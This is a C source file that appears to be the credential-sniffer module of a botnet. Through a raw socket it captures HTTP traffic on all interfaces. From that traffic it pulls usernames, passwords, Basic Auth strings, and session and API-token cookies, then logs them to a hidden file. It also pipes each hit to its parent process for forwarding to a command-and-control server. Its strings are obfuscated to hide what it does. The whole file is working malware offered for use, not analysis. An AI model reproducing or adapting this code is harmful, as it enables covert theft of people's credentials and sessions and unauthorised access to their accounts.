/* ==========================================================================
 *  sniffer.c — Passive network credential sniffer
 *  Captures raw packets via AF_PACKET on all interfaces.
 *  Filter chain: len >= 150 → IPv4 → TCP → HTTP ports → credential parse.
 *  Writes hits to a LOCAL file — no CNC pipe, zero network noise.
 *  Buffered: flushes every ~70s or when buffer is full or on SIGUSR1 (stop).
 *  Pure C, zero external deps. GCC 4.1.2 / uClibc compatible.
 * ========================================================================== */

#include "bot.h"
#include "headers/sniffer.h"

#ifndef NO_SELFREP

#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdio.h>

#ifdef DEBUG
#define SNIFF_DBG(fmt, ...) fprintf(stderr, "[sniff] " fmt "\n", ##__VA_ARGS__)
#else
#define SNIFF_DBG(fmt, ...) ((void)0)
#endif

/* ======================================================================
   GLOBALS
   ====================================================================== */

int _sn7PK3z = 0;   /* child PID (>0 = running) */
int _sn3ST8f = -1;  /* stats pipe read fd (parent side) */

static int stats_wr_fd = -1;  /* stats pipe write fd (child side) */
static uint32_t cnt_post = 0, cnt_basic = 0, cnt_cookie = 0, cnt_url = 0, cnt_total = 0;

/* ======================================================================
   HIT BUFFER — flushed to disk periodically
   ====================================================================== */

struct sniff_hit {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint16_t dst_port;
    uint8_t  type;
    char     user[SNIFF_MAX_USER];
    char     pass[SNIFF_MAX_PASS];
    uint32_t timestamp;
};

static struct sniff_hit hit_buf[SNIFF_MAX_HITS];
static int hit_count = 0;
static char log_path[512] = {0};
static volatile int flush_requested = 0;

static void flush_hits(void)
{
    FILE *f;
    int i;
    const char *type_str;

    if (hit_count == 0) return;

    f = fopen(log_path, _S(1,0xcd));
    if (!f) return;

    for (i = 0; i < hit_count; i++) {
        struct sniff_hit *h = &hit_buf[i];
        switch (h->type) {
            case SNIFF_TYPE_POST_CRED:  type_str = _S(4,0xfc,0xe3,0xff,0xf8);  break;
            case SNIFF_TYPE_BASIC_AUTH: type_str = _S(5,0xee,0xed,0xff,0xe5,0xef); break;
            case SNIFF_TYPE_COOKIE:     type_str = _S(6,0xef,0xe3,0xe3,0xe7,0xe5,0xe9); break;
            case SNIFF_TYPE_URL_CRED:   type_str = _S(3,0xf9,0xfe,0xe0);   break;
            default:                    type_str = _S(3,0xf9,0xe2,0xe7);   break;
        }
        fprintf(f, _S(39,0x89,0xd9,0xd0,0x89,0xdf,0xd0,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0xd0,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0x96,0x89,0xc8,0xd0,0x89,0xdf,0xd0,0x89,0xdf,0xa6),
                h->timestamp,
                type_str,
                h->src_ip & 0xff, (h->src_ip >> 8) & 0xff,
                (h->src_ip >> 16) & 0xff, (h->src_ip >> 24) & 0xff,
                h->dst_ip & 0xff, (h->dst_ip >> 8) & 0xff,
                (h->dst_ip >> 16) & 0xff, (h->dst_ip >> 24) & 0xff,
                h->dst_port,
                h->user, h->pass);
    }
    fclose(f);
    hit_count = 0;
}

static void record_hit(uint32_t src_ip, uint32_t dst_ip,
                       uint16_t dst_port, uint8_t hit_type,
                       const char *user, const char *pass)
{
    struct sniff_hit *h;

    if (hit_count >= SNIFF_MAX_HITS)
        flush_hits();

    h = &hit_buf[hit_count++];
    h->src_ip    = src_ip;
    h->dst_ip    = dst_ip;
    h->dst_port  = dst_port;
    h->type      = hit_type;
    h->timestamp = (uint32_t)time(NULL);

    if (user) { strncpy(h->user, user, SNIFF_MAX_USER - 1); h->user[SNIFF_MAX_USER - 1] = '\0'; }
    else h->user[0] = '\0';
    if (pass) { strncpy(h->pass, pass, SNIFF_MAX_PASS - 1); h->pass[SNIFF_MAX_PASS - 1] = '\0'; }
    else h->pass[0] = '\0';

    /* In-memory counters — no file writes */
    switch (hit_type) {
        case SNIFF_TYPE_POST_CRED:  cnt_post++;   break;
        case SNIFF_TYPE_BASIC_AUTH: cnt_basic++;  break;
        case SNIFF_TYPE_COOKIE:     cnt_cookie++; break;
        case SNIFF_TYPE_URL_CRED:   cnt_url++;    break;
    }
    cnt_total++;

    /* Exfiltrate hit to CNC via stats pipe — parent forwards to C2 */
    if (stats_wr_fd >= 0) {
        const char *tstr;
        char hbuf[512];
        int hlen;
        switch (hit_type) {
            case SNIFF_TYPE_POST_CRED:  tstr = _S(4,0xdc,0xc3,0xdf,0xd8);   break;
            case SNIFF_TYPE_BASIC_AUTH: tstr = _S(5,0xce,0xcd,0xdf,0xc5,0xcf);  break;
            case SNIFF_TYPE_COOKIE:     tstr = _S(6,0xcf,0xc3,0xc3,0xc7,0xc5,0xc9); break;
            case SNIFF_TYPE_URL_CRED:   tstr = _S(3,0xd9,0xde,0xc0);    break;
            default:                    tstr = _S(3,0xd9,0xc2,0xc7);    break;
        }
        hlen = snprintf(hbuf, sizeof(hbuf),
            _S(46,0xff,0xe2,0xe5,0xea,0xea,0xf3,0xe4,0xe5,0xf8,0xd0,0x89,0xdf,0xd0,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0xd0,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0x96,0x89,0xc8,0xd0,0x89,0xdf,0xd0,0x89,0xdf,0xa6),
            tstr,
            src_ip & 0xff, (src_ip >> 8) & 0xff,
            (src_ip >> 16) & 0xff, (src_ip >> 24) & 0xff,
            dst_ip & 0xff, (dst_ip >> 8) & 0xff,
            (dst_ip >> 16) & 0xff, (dst_ip >> 24) & 0xff,
            dst_port,
            user ? user : "", pass ? pass : "");
        if (hlen > 0 && hlen < (int)sizeof(hbuf))
            write(stats_wr_fd, hbuf, hlen);
    }

    SNIFF_DBG("hit type=%d src=%08x dst=%08x:%d user=%s", hit_type, src_ip, dst_ip, dst_port, user ? user : "");
}

/* SIGUSR1 handler — sets flag for graceful flush-and-exit */
static void sig_flush(int sig)
{
    (void)sig;
    flush_requested = 1;
}

/* ======================================================================
   SAFE STRING HELPERS
   ====================================================================== */

static const char *ci_memmem(const char *hay, int hlen, const char *ndl, int nlen)
{
    int i, j;
    if (nlen > hlen || nlen == 0) return NULL;
    for (i = 0; i <= hlen - nlen; i++) {
        for (j = 0; j < nlen; j++) {
            char a = hay[i + j], b = ndl[j];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) break;
        }
        if (j == nlen) return hay + i;
    }
    return NULL;
}

static int extract_value(const char *start, int maxlen, char *out, int outmax)
{
    int i = 0;
    while (i < maxlen && i < outmax - 1) {
        char c = start[i];
        if (c == '&' || c == ' ' || c == '\r' || c == '\n' || c == '\0' || c == ';')
            break;
        out[i] = c;
        i++;
    }
    out[i] = '\0';
    return i;
}

static void url_decode_inplace(char *s)
{
    char *r = s, *w = s;
    while (*r) {
        if (*r == '%' && r[1] && r[2]) {
            int hi = r[1], lo = r[2];
            if (hi >= '0' && hi <= '9') hi -= '0';
            else if (hi >= 'a' && hi <= 'f') hi = hi - 'a' + 10;
            else if (hi >= 'A' && hi <= 'F') hi = hi - 'A' + 10;
            else { *w++ = *r++; continue; }
            if (lo >= '0' && lo <= '9') lo -= '0';
            else if (lo >= 'a' && lo <= 'f') lo = lo - 'a' + 10;
            else if (lo >= 'A' && lo <= 'F') lo = lo - 'A' + 10;
            else { *w++ = *r++; continue; }
            *w++ = (char)((hi << 4) | lo);
            r += 3;
        } else if (*r == '+') {
            *w++ = ' ';
            r++;
        } else {
            *w++ = *r++;
        }
    }
    *w = '\0';
}

static int b64_decode_simple(const char *in, int inlen, char *out, int outmax)
{
    static const int8_t T[256] = {
        [0 ... 255] = -1,
        ['A'] = 0,  ['B'] = 1,  ['C'] = 2,  ['D'] = 3,  ['E'] = 4,
        ['F'] = 5,  ['G'] = 6,  ['H'] = 7,  ['I'] = 8,  ['J'] = 9,
        ['K'] = 10, ['L'] = 11, ['M'] = 12, ['N'] = 13, ['O'] = 14,
        ['P'] = 15, ['Q'] = 16, ['R'] = 17, ['S'] = 18, ['T'] = 19,
        ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23, ['Y'] = 24,
        ['Z'] = 25,
        ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29, ['e'] = 30,
        ['f'] = 31, ['g'] = 32, ['h'] = 33, ['i'] = 34, ['j'] = 35,
        ['k'] = 36, ['l'] = 37, ['m'] = 38, ['n'] = 39, ['o'] = 40,
        ['p'] = 41, ['q'] = 42, ['r'] = 43, ['s'] = 44, ['t'] = 45,
        ['u'] = 46, ['v'] = 47, ['w'] = 48, ['x'] = 49, ['y'] = 50,
        ['z'] = 51,
        ['0'] = 52, ['1'] = 53, ['2'] = 54, ['3'] = 55, ['4'] = 56,
        ['5'] = 57, ['6'] = 58, ['7'] = 59, ['8'] = 60, ['9'] = 61,
        ['+'] = 62, ['/'] = 63,
    };
    int i = 0, o = 0;
    uint32_t acc = 0;
    int bits = 0;
    for (i = 0; i < inlen && o < outmax - 1; i++) {
        int8_t v = T[(uint8_t)in[i]];
        if (v < 0) continue;
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (char)((acc >> bits) & 0xFF);
        }
    }
    out[o] = '\0';
    return o;
}

/* ======================================================================
   HTTP CREDENTIAL PARSERS
   ====================================================================== */

static const char *cred_keys_user[] = { "user=", "username=", "login=", "email=", "name=", "usr=", NULL };
static const char *cred_keys_pass[] = { "pass=", "password=", "passwd=", "pwd=", "secret=", "token=", NULL };

static void check_post_creds(uint32_t src_ip, uint32_t dst_ip, uint16_t dst_port,
                             const char *payload, int plen)
{
    const char *body;
    int blen;
    char user[SNIFF_MAX_USER] = {0};
    char pass[SNIFF_MAX_PASS] = {0};
    int i;

    body = ci_memmem(payload, plen, _S(4,0xa1,0xa6,0xa1,0xa6), 4);
    if (!body) return;
    body += 4;
    blen = plen - (int)(body - payload);
    if (blen <= 5) return;

    /* Only form-urlencoded */
    {
        const char *ct = ci_memmem(payload, (int)(body - payload), _S(13,0xcf,0xc3,0xc2,0xd8,0xc9,0xc2,0xd8,0x81,0xd8,0xd5,0xdc,0xc9,0x96), 13);
        if (ct) {
            if (!ci_memmem(ct, 80, _S(10,0xd9,0xde,0xc0,0xc9,0xc2,0xcf,0xc3,0xc8,0xc9,0xc8), 10) && !ci_memmem(ct, 80, _S(4,0xca,0xc3,0xde,0xc1), 4))
                return;
        }
    }

    for (i = 0; cred_keys_user[i]; i++) {
        const char *p = ci_memmem(body, blen, cred_keys_user[i], strlen(cred_keys_user[i]));
        if (p) {
            p += strlen(cred_keys_user[i]);
            extract_value(p, blen - (int)(p - body), user, sizeof(user));
            url_decode_inplace(user);
            break;
        }
    }

    for (i = 0; cred_keys_pass[i]; i++) {
        const char *p = ci_memmem(body, blen, cred_keys_pass[i], strlen(cred_keys_pass[i]));
        if (p) {
            p += strlen(cred_keys_pass[i]);
            extract_value(p, blen - (int)(p - body), pass, sizeof(pass));
            url_decode_inplace(pass);
            break;
        }
    }

    if (user[0] || pass[0])
        record_hit(src_ip, dst_ip, dst_port, SNIFF_TYPE_POST_CRED, user, pass);
}

static void check_basic_auth(uint32_t src_ip, uint32_t dst_ip, uint16_t dst_port,
                             const char *payload, int plen)
{
    const char *auth, *b64start;
    int b64len, i;
    char decoded[256];
    int dlen;
    char user[SNIFF_MAX_USER] = {0};
    char pass[SNIFF_MAX_PASS] = {0};

    auth = ci_memmem(payload, plen, _S(21,0xcd,0xd9,0xd8,0xc4,0xc3,0xde,0xc5,0xd6,0xcd,0xd8,0xc5,0xc3,0xc2,0x96,0x8c,0xce,0xcd,0xdf,0xc5,0xcf,0x8c), 21);
    if (!auth) return;

    b64start = auth + 21;
    b64len = 0;
    while (b64start + b64len < payload + plen &&
           b64start[b64len] != '\r' && b64start[b64len] != '\n' &&
           b64start[b64len] != ' ' && b64len < 200)
        b64len++;
    if (b64len < 3) return;

    dlen = b64_decode_simple(b64start, b64len, decoded, sizeof(decoded));
    if (dlen < 3) return;

    for (i = 0; i < dlen; i++) {
        if (decoded[i] == ':') {
            if (i > 0 && i < (int)sizeof(user)) { memcpy(user, decoded, i); user[i] = '\0'; }
            if (dlen - i - 1 > 0 && dlen - i - 1 < (int)sizeof(pass)) {
                memcpy(pass, decoded + i + 1, dlen - i - 1);
                pass[dlen - i - 1] = '\0';
            }
            break;
        }
    }

    if (user[0] || pass[0])
        record_hit(src_ip, dst_ip, dst_port, SNIFF_TYPE_BASIC_AUTH, user, pass);
}

static void check_cookies(uint32_t src_ip, uint32_t dst_ip, uint16_t dst_port,
                          const char *payload, int plen)
{
    static const char *interesting[] = {
        "session=", "sessionid=", "sid=", "phpsessid=",
        "auth_token=", "access_token=", "jwt=", "bearer=",
        "csrftoken=", "api_key=", "apikey=",
        NULL
    };
    const char *cookie;
    int clen, i;
    char val[256] = {0};

    cookie = ci_memmem(payload, plen, _S(7,0xcf,0xc3,0xc3,0xc7,0xc5,0xc9,0x96), 7);
    if (!cookie) return;
    cookie += 7;
    while (*cookie == ' ') cookie++;
    clen = plen - (int)(cookie - payload);
    for (i = 0; i < clen; i++) {
        if (cookie[i] == '\r' || cookie[i] == '\n') { clen = i; break; }
    }
    if (clen < 5) return;

    for (i = 0; interesting[i]; i++) {
        const char *p = ci_memmem(cookie, clen, interesting[i], strlen(interesting[i]));
        if (p) {
            p += strlen(interesting[i]);
            extract_value(p, clen - (int)(p - cookie), val, sizeof(val));
            if (val[0])
                record_hit(src_ip, dst_ip, dst_port, SNIFF_TYPE_COOKIE, interesting[i], val);
        }
    }
}

static void check_url_creds(uint32_t src_ip, uint32_t dst_ip, uint16_t dst_port,
                            const char *payload, int plen)
{
    const char *qmark = NULL;
    int qlen, i;
    char user[SNIFF_MAX_USER] = {0};
    char pass[SNIFF_MAX_PASS] = {0};

    for (i = 0; i < plen && i < 2048; i++) {
        if (payload[i] == '?') { qmark = payload + i + 1; break; }
        if (payload[i] == '\r' || payload[i] == '\n') break;
    }
    if (!qmark) return;

    qlen = 0;
    while (qmark + qlen < payload + plen && qmark[qlen] != ' ' &&
           qmark[qlen] != '\r' && qmark[qlen] != '\n' && qlen < 2048)
        qlen++;
    if (qlen < 5) return;

    for (i = 0; cred_keys_user[i]; i++) {
        const char *p = ci_memmem(qmark, qlen, cred_keys_user[i], strlen(cred_keys_user[i]));
        if (p) {
            p += strlen(cred_keys_user[i]);
            extract_value(p, qlen - (int)(p - qmark), user, sizeof(user));
            url_decode_inplace(user);
            break;
        }
    }
    for (i = 0; cred_keys_pass[i]; i++) {
        const char *p = ci_memmem(qmark, qlen, cred_keys_pass[i], strlen(cred_keys_pass[i]));
        if (p) {
            p += strlen(cred_keys_pass[i]);
            extract_value(p, qlen - (int)(p - qmark), pass, sizeof(pass));
            url_decode_inplace(pass);
            break;
        }
    }

    if (user[0] || pass[0])
        record_hit(src_ip, dst_ip, dst_port, SNIFF_TYPE_URL_CRED, user, pass);
}

/* ======================================================================
   MAIN CAPTURE LOOP (runs in forked child)
   ====================================================================== */

static void sniff_loop(void)
{
    int sock;
    char buf[65535];
    uint32_t last_flush;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        SNIFF_DBG("AF_PACKET socket failed: %d", errno);
        _exit(1);
    }

    /* SIGUSR1 for graceful stop — parent sends before SIGKILL */
    signal(SIGUSR1, sig_flush);

    last_flush = (uint32_t)time(NULL);
    SNIFF_DBG("capture loop started (sock=%d, log=%s)", sock, log_path);

    for (;;) {
        int n;
        struct ethhdr *eth;
        struct iphdr *ip;
        struct tcphdr *tcp;
        int ip_hlen, tcp_hlen;
        uint16_t dport, sport;
        char *payload;
        int payload_len;
        uint32_t now;

        /* Check graceful stop flag */
        if (flush_requested) {
            flush_hits();
            /* Final stats push before exit */
            if (stats_wr_fd >= 0) {
                char sbuf[128];
                int slen = snprintf(sbuf, sizeof(sbuf),
                    _S(49,0xff,0xe2,0xe5,0xea,0xea,0xd0,0xdc,0xc3,0xdf,0xd8,0x96,0x89,0xd9,0xd0,0xce,0xcd,0xdf,0xc5,0xcf,0x96,0x89,0xd9,0xd0,0xcf,0xc3,0xc3,0xc7,0xc5,0xc9,0x96,0x89,0xd9,0xd0,0xd9,0xde,0xc0,0x96,0x89,0xd9,0xd0,0xd8,0xc3,0xd8,0xcd,0xc0,0x96,0x89,0xd9,0xa6),
                    cnt_post, cnt_basic, cnt_cookie, cnt_url, cnt_total);
                if (slen > 0) write(stats_wr_fd, sbuf, slen);
                close(stats_wr_fd);
            }
            close(sock);
            _exit(0);
        }

        /* Periodic flush + stats report */
        now = (uint32_t)time(NULL);
        if (now - last_flush >= SNIFF_FLUSH_INTERVAL) {
            flush_hits();
            /* Send lightweight counters to parent via pipe */
            if (stats_wr_fd >= 0) {
                char sbuf[128];
                int slen = snprintf(sbuf, sizeof(sbuf),
                    _S(49,0xff,0xe2,0xe5,0xea,0xea,0xd0,0xdc,0xc3,0xdf,0xd8,0x96,0x89,0xd9,0xd0,0xce,0xcd,0xdf,0xc5,0xcf,0x96,0x89,0xd9,0xd0,0xcf,0xc3,0xc3,0xc7,0xc5,0xc9,0x96,0x89,0xd9,0xd0,0xd9,0xde,0xc0,0x96,0x89,0xd9,0xd0,0xd8,0xc3,0xd8,0xcd,0xc0,0x96,0x89,0xd9,0xa6),
                    cnt_post, cnt_basic, cnt_cookie, cnt_url, cnt_total);
                if (slen > 0) write(stats_wr_fd, sbuf, slen);
            }
            last_flush = now;
        }

        n = recvfrom(sock, buf, sizeof(buf), 0, NULL, NULL);

        /* ---- FILTER 1: minimum size (noise gate) ---- */
        if (n < SNIFF_MIN_PKT) continue;

        /* ---- FILTER 2: IPv4 ---- */
        eth = (struct ethhdr *)buf;
        if (ntohs(eth->h_proto) != ETH_P_IP) continue;

        ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
        if ((char *)ip + sizeof(struct iphdr) > buf + n) continue;
        if (ip->version != 4) continue;

        /* ---- FILTER 3: TCP ---- */
        if (ip->protocol != IPPROTO_TCP) continue;

        ip_hlen = ip->ihl * 4;
        if (ip_hlen < 20) continue;
        tcp = (struct tcphdr *)((char *)ip + ip_hlen);
        if ((char *)tcp + sizeof(struct tcphdr) > buf + n) continue;

        tcp_hlen = tcp->doff * 4;
        if (tcp_hlen < 20) continue;

        dport = ntohs(tcp->dest);
        sport = ntohs(tcp->source);

        /* ---- FILTER 4: HTTP ports ---- */
        if (dport != SNIFF_PORT_HTTP     && sport != SNIFF_PORT_HTTP &&
            dport != SNIFF_PORT_HTTP_ALT  && sport != SNIFF_PORT_HTTP_ALT &&
            dport != SNIFF_PORT_HTTP_ALT2 && sport != SNIFF_PORT_HTTP_ALT2 &&
            dport != SNIFF_PORT_HTTP_ALT3 && sport != SNIFF_PORT_HTTP_ALT3)
            continue;

        /* Extract TCP payload */
        payload = (char *)tcp + tcp_hlen;
        payload_len = n - (int)(payload - buf);
        if (payload_len <= 10) continue;

        /* ---- HTTP CHECKS — only requests ---- */
        if (payload_len > 4 && (
            memcmp(payload, _S(4,0xeb,0xe9,0xf8,0x8c), 4) == 0 ||
            memcmp(payload, _S(4,0xfc,0xe3,0xff,0xf8), 4) == 0 ||
            memcmp(payload, _S(4,0xfc,0xf9,0xf8,0x8c), 4) == 0 ||
            memcmp(payload, _S(4,0xe4,0xe9,0xed,0xe8), 4) == 0))
        {
            if (memcmp(payload, _S(4,0xfc,0xe3,0xff,0xf8), 4) == 0)
                check_post_creds(ip->saddr, ip->daddr, dport, payload, payload_len);

            check_url_creds(ip->saddr, ip->daddr, dport, payload, payload_len);
            check_basic_auth(ip->saddr, ip->daddr, dport, payload, payload_len);
            check_cookies(ip->saddr, ip->daddr, dport, payload, payload_len);
        }
    }
}

/* ======================================================================
   PUBLIC API
   ====================================================================== */

void sniffer_init(const char *logpath)
{
    pid_t pid;
    int pipefd[2];

    if (_sn7PK3z > 0) return;  /* already running */

    if (!logpath || !logpath[0]) logpath = _S(15,0x83,0xd8,0xc1,0xdc,0x83,0x82,0xdf,0xc2,0xc5,0xca,0xca,0x82,0xc0,0xc3,0xcb);
    strncpy(log_path, logpath, sizeof(log_path) - 1);
    log_path[sizeof(log_path) - 1] = '\0';

    /* Stats pipe: child writes counters, parent reads */
    if (pipe(pipefd) < 0) return;

    pid = fork();
    if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return; }
    if (pid > 0) {
        /* parent — keep read end, non-blocking */
        close(pipefd[1]);
        _sn3ST8f = pipefd[0];
        fcntl(_sn3ST8f, F_SETFL, fcntl(_sn3ST8f, F_GETFL) | O_NONBLOCK);
        _sn7PK3z = pid;
        SNIFF_DBG("init: forked child pid=%d, log=%s, stats_fd=%d", pid, log_path, _sn3ST8f);
        return;
    }

    /* child — keep write end */
    close(pipefd[0]);
    stats_wr_fd = pipefd[1];
    if (_ib2tD7y >= 0) { close(_ib2tD7y); _ib2tD7y = -1; }

    sniff_loop();
    _exit(0);
}

void sniffer_kill(void)
{
    if (_sn7PK3z > 0) {
        /* SIGUSR1 first for graceful flush, then SIGKILL fallback */
        kill(_sn7PK3z, SIGUSR1);
        usleep(200000);  /* 200ms for flush */
        kill(_sn7PK3z, 9);
        waitpid(_sn7PK3z, NULL, WNOHANG);
    }
    _sn7PK3z = 0;
    if (_sn3ST8f >= 0) { close(_sn3ST8f); _sn3ST8f = -1; }
    SNIFF_DBG("killed");
}

#endif /* NO_SELFREP */
